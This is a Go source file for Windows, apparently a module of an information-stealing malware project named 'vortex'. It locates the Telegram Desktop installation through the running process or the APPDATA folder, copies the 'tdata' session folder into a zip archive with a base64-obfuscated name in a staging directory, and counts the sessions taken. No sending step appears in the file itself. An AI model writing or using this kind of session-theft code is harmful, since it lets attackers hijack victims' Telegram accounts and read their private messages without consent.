//go:build windows

package messenger

import (
	"os"
	"path/filepath"
	"strings"
	"vortex/encrypt"
	"vortex/hutil"
)

func GetTelegramProcessPath(mainFolder string) error {
	procID, err := hutil.GetProcessIdByName(strings.ToLower("telegram.exe"))
	if err != nil {
		return err
	}
	if procID != 0 {
		path, err := hutil.GetProcessPath("Telegram.exe")
		if err != nil {
			return err
		}
		if err = getTelegramSessions(mainFolder, filepath.Dir(path)); err != nil {
			return err
		}

	}
	return nil
}

func GetTelegramDefaultPath(mainFolder string) error {
	telePath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop")
	if _, err := os.Stat(telePath); os.IsNotExist(err) {
		return nil
	}
	if err := getTelegramSessions(mainFolder, telePath); err != nil {
		return err
	}
	return nil
}

func getTelegramSessions(mainFolder string, telePath string) error {

	teleSession := filepath.Join(telePath, "tdata")

	teleZip := filepath.Join(mainFolder, encrypt.B64Util("messenger-telegram-tdata.zip", 0))

	if err := hutil.ZipFolder(filepath.Base(teleSession), teleSession, teleZip, "work"); err != nil {
		return err
	}

	hutil.Sessions++

	return nil
}
